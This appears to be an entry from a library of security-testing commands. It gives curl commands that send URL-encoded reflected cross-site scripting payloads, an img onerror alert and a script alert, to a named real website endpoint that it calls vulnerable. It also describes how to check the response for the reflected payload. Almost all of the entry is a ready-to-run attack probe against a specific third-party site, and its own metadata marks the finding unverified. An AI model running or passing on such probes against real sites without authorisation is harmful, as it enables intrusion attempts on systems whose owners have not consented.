---
data: >-
  curl
  "https://play.mtn.co.za/callertunez/?page=2%27%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E"
  -v
tags:
  - xss
  - web-testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.504Z'
id: 239573bb-d66e-42fb-aed1-b1b67845122f
verified: false
validated: true
submitted: true
---
# curl-xss-test

## Command

```bash
curl "https://play.mtn.co.za/callertunez/?page=2%27%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E" -v
```

## Description

This command uses curl to send a GET request to the vulnerable endpoint with an encoded XSS payload in the 'page' parameter, simulating the attack vector for verification. It is useful for testing without a browser, checking server response for reflection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with encoded payload | Yes |
| -v | Verbose output to inspect response headers and body | No |

## Examples

### Basic Usage

```bash
curl "https://play.mtn.co.za/callertunez/?page=2%27" -v
```

### Advanced Usage

```bash
curl -X GET "https://play.mtn.co.za/callertunez/?page=%27%22%3E%3Cscript%3Ealert(1)%3C/script%3E" -v -o response.html
```

## Expected Output

HTTP response body containing the reflected payload, e.g., HTML with <img src=x onerror=alert(document.domain)>, confirming injection. No alert in curl, but inspect body for execution potential.

## Related

- [[Related Procedure]]
